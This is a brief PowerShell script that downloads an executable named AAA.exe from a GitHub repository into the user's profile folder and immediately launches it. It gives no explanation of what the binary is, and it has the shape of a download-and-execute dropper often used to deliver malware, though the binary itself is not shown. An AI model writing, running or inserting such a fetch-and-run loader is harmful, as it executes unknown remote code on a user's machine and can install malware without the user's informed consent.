$destinationPath = "$env:USERPROFILE\AAA.exe"
$url = "https://github.com/webntdev/webntdev.github.io/raw/main/AAA/AAA.exe"

if (-Not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

Start-Process $destinationPath
